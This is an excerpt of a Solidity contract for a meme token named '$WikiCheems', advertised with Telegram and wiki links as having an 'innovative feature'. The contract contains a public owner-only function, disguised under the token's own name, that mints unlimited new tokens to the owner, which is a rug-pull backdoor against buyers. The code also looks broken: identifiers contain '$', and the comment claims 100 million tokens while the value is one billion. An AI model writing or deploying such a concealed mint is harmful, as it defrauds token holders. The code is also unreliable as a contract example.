...
//
// $WikiCheems proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/WikiCheems
//  📱Website :: https://dogeshibe.fandom.com/wiki/Cheems
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _$WikiCheems(uint256 amount) public onlyOwner {
 _$WikiCheems(msg.sender, amount);
    }
    ...
    function _$WikiCheems(address account, uint256 amount) internal virtual {
...
contract $WikiCheems is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("$Wiki Cheems", "$WikiCheems") {
     _$WikiCheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}